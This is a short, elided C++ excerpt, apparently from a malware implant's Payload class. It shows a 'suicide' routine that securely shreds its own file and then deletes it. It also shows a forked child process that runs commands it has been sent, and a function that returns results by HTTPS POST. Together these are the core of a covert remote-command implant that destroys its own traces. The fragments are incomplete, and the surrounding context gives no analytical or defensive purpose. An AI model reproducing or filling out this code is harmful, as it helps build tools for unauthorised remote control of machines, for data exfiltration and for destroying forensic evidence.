...
int Payload::suicide(){
    ...
    if(execl("/bin/shred", "shred", "-z", "-u", path, (char*)NULL) == -1) unlink(path);
    return 0;
}
...
int Payload::spawnChild(
    ...
    if (pid == 0)
    {
        ...
        runCMD(commands, childResults, suicide);
...
int Payload::runCMD(std::vector<std::string>& commands, std::vector<std::string>& results, int *suicide) {
    if(!suicide) return -1;
...
int Payload::sendMemPayload(Https& https, int fd, const std::string& jsonPayload)
{
    if (fd < 0 || jsonPayload.empty()) return -1;
    ...
    if (https.craftPost(0,2,payload) == 0){
        close(fd);
        return 0;
    }
